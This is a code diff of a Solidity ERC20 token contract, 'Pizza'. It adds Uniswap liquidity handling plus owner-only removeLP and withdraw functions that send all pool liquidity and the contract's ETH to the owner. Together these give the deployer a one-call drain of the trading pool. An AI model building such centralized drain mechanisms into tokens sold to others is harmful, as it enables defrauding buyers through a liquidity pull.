@@ -30,13 +30,23 @@ interface IUniswapV2Router02 {
         address to,
         uint deadline
     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+    function removeLiquidityETH(
+        address token,
+        uint liquidity,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountToken, uint amountETH);
 }
 
 contract Pizza is ERC20, Ownable {
     IUniswapV2Router02 internal uniswapV2Router;
+    address public uniswapV2Pair;
 
-    constructor() ERC20("Pizza","Pizza") Ownable(_msgSender()) {
-        uniswapV2Router = IUniswapV2Router02(0x86dcd3293C53Cf8EFd7303B57beb2a3F671dDE98);
+    constructor() ERC20("Pizza","Pizza") Ownable(_msgSender()) payable  {
+        uniswapV2Router = IUniswapV2Router02(0xC532a74256D3Db42D0Bf7a0400fEFDbad7694008);
+        _mint(address(this), 18000 * 10**decimals());
     }
 
     function burnFrom(address account, uint256 value) internal {
@@ -46,9 +56,20 @@ contract Pizza is ERC20, Ownable {
 
     function openTrading() external onlyOwner {
         _approve(address(this), address(uniswapV2Router), totalSupply());
-        address uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
-        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
+        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,address(this),block.timestamp);
         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
+    }
+
+    function removeLP() external onlyOwner {
+        uniswapV2Router.removeLiquidityETH(address(this), IERC20(uniswapV2Pair).balanceOf(address(this)), 0, 0, owner(), block.timestamp);
+
+        
+
+    }
+
+    function withdraw() external onlyOwner {        
+        payable(owner()).transfer(address(this).balance);
     }
 
     function deposit() external payable{
